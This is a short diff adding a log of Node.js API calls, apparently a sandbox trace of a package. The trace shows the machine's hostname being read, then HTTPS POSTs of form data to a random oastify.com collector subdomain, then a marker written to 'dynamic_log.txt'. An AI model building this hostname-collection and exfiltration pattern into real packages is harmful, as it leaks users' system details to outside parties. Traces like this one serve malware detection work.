@@ -1,0 +1,5 @@
+[os.hostname] []
+[https.request] [{"hostname":"o6v6iatg9ab4jphl2jqw8t3takgb47sw.oastify.com","port":443,"path":"/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":901}},null]
+[os.hostname] []
+[https.request] [{"hostname":"o6v6iatg9ab4jphl2jqw8t3takgb47sw.oastify.com","port":443,"path":"/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":902}},null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
